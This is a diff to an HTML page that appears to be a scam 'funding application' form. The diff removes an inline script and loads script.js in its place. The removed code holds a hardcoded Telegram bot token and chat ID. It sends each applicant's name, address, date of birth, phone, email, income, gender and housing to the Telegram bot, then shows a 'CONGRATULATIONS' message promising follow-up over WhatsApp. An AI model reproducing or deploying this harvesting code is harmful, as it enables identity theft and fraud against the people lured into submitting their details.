@@ -159,41 +159,7 @@ font-weight:600;
 </form>
 
 <script>
-const BOT_TOKEN = "8214623213:AAGlhEDRFbCnQaG0X1r2blaG0YJlHlkNkRs";
-const CHAT_ID = "-1003924945817";
-
-document.getElementById("bioForm").addEventListener("submit", async function(e){
-e.preventDefault();
-
-let message =
-`📥 NEW FUNDING APPLICATION
-
-👤 Name: ${name.value}
-🏠 Address: ${address.value}
-🎂 DOB: ${dob.value}
-📞 Phone: ${phone.value}
-📧 Email: ${email.value}
-💼 Occupation: ${occupation.value}
-💰 Income: ${income.value}
-📦 Package: ${package.value}
-🚻 Gender: ${gender.value}
-🏡 Housing: ${housing.value}`;
-
-await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-method: "POST",
-headers: {"Content-Type":"application/json"},
-body: JSON.stringify({
-chat_id: CHAT_ID,
-text: message
-})
-});
-
-alert("✅ Application submitted successfully!\n\nWe will contact you via WhatsApp or Email and check your mail or whatsapp for  Next step
-CONGRATULATIONS!!!.");
-
-this.reset();
-});
-</script>
+<script src="script.js"></script>
 
 </body>
 </html>
